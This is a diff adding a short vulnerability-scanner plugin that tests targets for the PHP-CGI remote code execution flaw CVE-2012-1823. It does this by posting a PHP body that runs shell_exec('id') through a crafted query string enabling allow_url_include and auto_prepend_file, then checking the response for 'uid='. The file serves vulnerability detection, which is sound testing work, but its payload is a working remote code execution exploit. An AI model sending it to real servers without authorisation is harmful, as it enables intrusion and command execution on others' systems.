@@ -1,0 +1,14 @@
+#request url = var
+#define payload = /index.php?-d+allow_url_include%3don+-d+auto_prepend_file%3dphp%3a//input
+#define bug =uid=
+#define info = 存在PHP-CGI远程代码执行漏洞（CVE-2012-1823）
+#define post = <?php echo shell_exec("id"); ?>
+
+function main(args)
+{
+	res = HttpPost(url.payload,post,"User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0");
+	if(StrFindStr(res[0],bug,0)!= "-1")
+	{
+		print(url.info);
+	}
+}
